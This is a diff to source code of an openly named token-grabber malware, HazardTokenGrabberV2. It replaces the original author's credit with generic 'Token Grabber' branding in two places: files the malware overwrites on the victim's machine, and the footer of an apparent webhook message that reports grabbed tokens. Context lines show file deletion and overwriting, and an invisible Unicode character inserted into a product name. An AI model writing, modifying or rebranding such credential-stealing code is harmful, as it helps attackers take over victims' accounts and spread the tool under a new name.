@@ -480,9 +480,9 @@ class HazardTokenGrabberV2(Functions):
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                            f.write("Token Grabber")
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+                            fp.write(x+"\n\nThis Is A Ultimateum Token Grabber")
 
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
@@ -568,7 +568,7 @@ class HazardTokenGrabberV2(Functions):
                         }
                     ],
                     'footer': {
-                        'text': '🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'
+                        'text': 'Token Grabbed - By Token Grabber'
                     }
                 }
             ]
